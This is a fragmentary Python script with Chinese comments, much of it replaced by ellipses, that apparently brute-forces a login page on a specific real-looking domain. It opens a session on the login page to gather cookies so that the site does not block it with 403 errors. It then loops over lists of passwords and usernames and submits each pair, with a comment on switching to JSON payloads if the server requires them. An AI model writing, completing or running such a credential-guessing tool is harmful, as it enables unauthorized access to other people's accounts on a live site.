...
LOGIN_PAGE = "https://xn--4gq62f52gdss.com/auth/login"
...
def main():
    ...
    with requests.Session() as session:
        ...
        # 【核心新增】：先访问一次登录页获取必要的 Cookie / Session 凭证，防止直接 403
        try:
            print("[*] 正在初始化会话，获取安全 Cookie...")
        ...
        for password in passwords:
            ...
            for username in usernames:
                ...
                try:
                    ...
                    # 尝试用 Form Data 提交；如果服务器强制要求 JSON，可将 data=payload 改为 json=payload
